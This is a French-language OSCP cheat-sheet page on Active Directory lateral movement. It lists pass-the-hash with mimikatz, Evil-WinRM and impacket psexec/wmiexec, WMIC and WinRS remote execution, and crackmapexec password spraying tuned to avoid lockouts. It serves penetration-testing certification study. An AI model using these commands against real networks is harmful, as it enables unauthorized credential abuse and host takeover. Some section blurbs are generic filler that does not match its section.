---
title: "OSCP · Active Directory : mouvement latéral"
description: "Référence des accès distants et protocoles entre hôtes Windows."
---

# OSCP · Active Directory : mouvement latéral

Référence des accès distants et protocoles entre hôtes Windows.


## Techniques et préparation

Commandes, paramètres et exemples associés à cette technique.


```powershell
powershell -ExecutionPolicy Bypass -File [script].ps1
```


```text
crackmapexec
```


```powershell
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /run:powershell

# You can then execute commands in the PowerShell session as if you were logged in as the other user, for example here we are moving to another system as the other user and running a shell:
.\PsExec.exe \\<target_system> cmd
```


## From Kali

Commandes, paramètres et exemples associés à cette technique.


### Evil-WinRM

Observer les permissions et la configuration de Windows.


```bash
evil-winrm -u <username> -p <password> -i <target_ip>
```


```bash
# Use -S option to ignore SSL validation for insecure systems.
evil-winrm -i <target_ip> -u <username> -H <LM_hash>:<NTLM_hash>
# or
evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTLM_hash>
```


### PsExec

Commandes, paramètres et exemples associés à cette technique.


```bash
impacket-psexec <username>:<password>@<target_ip>
```


```bash
impacket-psexec <username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
# or
impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:<NTLM_hash>
```


### VMIExec

Commandes, paramètres et exemples associés à cette technique.


```bash
impacket-wmiexec <username>:<password>@<target_ip>
```


```bash
impacket-wmiexec -hashes <LM_hash>:<NTLM_hash> <username>@<target_ip>
# or
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>
```


## From Windows

Observer les permissions et la configuration de Windows.


### DCOM (Distributed Component Object Model)

Commandes, paramètres et exemples associés à cette technique.


```powershell
Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" -Name "DCOMServer"
```


```powershell
Invoke-Command
```


```powershell
$targetIP = "<target_ip>"  # Replace with the actual target IP
$username = "<username>"    # Replace with the actual username
$password = "<password>"     # Replace with the actual password
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $secureString)

Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ipconfig }
```


```text
vmiexec
```


```bash
wmiexec.py <domain>/<username>:<password>@<target_ip>
# or
wmiexec.py <domain>/<username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
```


### PsExec

Commandes, paramètres et exemples associés à cette technique.


```bash
psexec.exe \\<target_ip> -u <username> -p <password> cmd
```


### WinRM

Observer les permissions et la configuration de Windows.


```powershell
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <target_ip> -Credential $credential;
```


### WinRS

Commandes, paramètres et exemples associés à cette technique.


```powershell
winrs -r:<target_ip> -u:<username> -p:<password> "<command>"
```


### WMIC

Commandes, paramètres et exemples associés à cette technique.


```powershell
wmic /node:<target_ip> /user:<username> /password:<password> process call create "<command>"
```


## Credential Spraying with CrackMapExec

Vérifier les comptes, les secrets et les mécanismes d'authentification.


### Tips for Credential Spraying

Vérifier les comptes, les secrets et les mécanismes d'authentification.


```text
--delay
```


```text
--max-retries
```


```bash
# Check policies with a tool like rpcclient
rpcclient -U "" <DOMAIN_IP> -c "getdompwinfo"

# Test multiple passwords with a delay to avoid lockouts
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5

# Test multiple passwords with a max retries limit to avoid lockouts
crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --max-retries 3
```


```bash
# Use CrackMapExec's --target option to narrow focus
crackmapexec smb <TARGET_IP> --target-ips subdomains.txt -u users.txt -p passwords.txt
```


```text
--local-auth
```


```bash
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> > output.log
```


```text
enum4linux
```


```text
crackmapexec
```


```bash
crackmapexec smb <IP_list>.txt -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
```


```text
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> --users
```


```text
crackmapexec rdp <TARGET_IP> -u users.txt -p <PASSWORD>
```


```bash
nmap -p 5985,1433,445,3389 <TARGET_IP>
```


```text
-p
```


```text
-H
```


```bash
# Test both passwords and NTLM hashes
crackmapexec smb <DOMAIN_IP> -u users.txt -p passwords.txt -H hashes.txt -d <DOMAIN_NAME>
```


### SMB

Examiner les objets, les droits et les services du domaine.


```bash
# Test a single password across all users in the domain
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p <PASSWORD> --spray --delay 5

# Test multiple passwords with a delay to avoid lockouts
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5
```


```bash
# Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com)
crackmapexec smb <SUBDOMAIN_IP> -d <SUBDOMAIN_NAME> -u users.txt -p <PASSWORD>
```


```bash
# Test credentials against local accounts not part of the domain
crackmapexec smb <IP> -u local_users.txt -p <PASSWORD> --local-auth
```


```bash
# Execute a command on a remote machine with valid credentials
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"

# Using NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"
```


### WinRM (Windows Remote Management)

Observer les permissions et la configuration de Windows.


```bash
# Test credentials on the main domain via WinRM
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --spray --delay 5

# Test NTLM hash
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --spray --delay 5

# Execute a command
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"
```


```bash
# Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com). Authenticate on a subdomain
crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


```bash
# Authenticate with a local user account
crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Using NTLM hash
crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
```


```bash
# Execute a command remotely
crackmapexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "ipconfig"

# Using an NTLM hash
crackmapexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "ipconfig"
```


### PsExec (SMB-Based Lateral Movement)

Examiner les objets, les droits et les services du domaine.


```bash
# Gain a shell using valid credentials
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method smbexec

# Gain a shell using NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method smbexec
```


```bash
# Execute a remote command
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"

# Using an NTLM hash
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"
```


### VMIExec

Commandes, paramètres et exemples associés à cette technique.


```bash
# Gain a shell using valid credentials
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method wmiexec

# Gain a shell using NTLM hash
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method wmiexec
```


### LDAP (Lightweight Directory Access Protocol)

Examiner les objets, les droits et les services du domaine.


```bash
# Authenticate and enumerate users on the main domain
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Using NTLM hash
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
```


```bash
# Enumerate users on a subdomain
crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


### MSSQL (Microsoft SQL Server)

Examiner les connexions, la configuration et les requêtes de la base de données.


```bash
# Test main domain credentials on an MSSQL server
crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Using NTLM hash
crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
```


```bash
# Test credentials on a subdomain MSSQL server
crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


```bash
# Test local user credentials on MSSQL
crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Using NTLM hash
crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
```


### RDP

Commandes, paramètres et exemples associés à cette technique.


```bash
# Test credentials against an RDP service on the main domain
crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Using NTLM hash
crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
```


```bash
# Test credentials on an RDP service in a subdomain
crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Using NTLM hash
crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
```


```bash
# Authenticate to RDP with local credentials
crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Using NTLM hash
crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
```


### FTP

Transférer ou récupérer des fichiers dans le laboratoire.


```bash
crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```


### SSH

Commandes, paramètres et exemples associés à cette technique.


```bash
crackmapexec ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```


### HTTP

Examiner les entrées et les réponses de l'application web.


```bash
crackmapexec http <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```


---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
